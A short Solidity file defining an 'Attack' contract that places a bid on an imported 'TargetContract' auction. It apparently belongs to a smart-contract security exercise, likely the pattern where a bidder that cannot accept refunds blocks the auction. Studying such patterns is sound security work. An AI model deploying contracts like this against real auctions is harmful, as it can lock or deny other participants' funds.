// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./TargetContract.sol";
contract Attack {
    
    TargetContract public targetContract;
    
    constructor(address _targetContract) {
        targetContract = TargetContract(_targetContract);
    }

    function attack() public payable {
        targetContract.bidding{value:msg.value}();
    }

}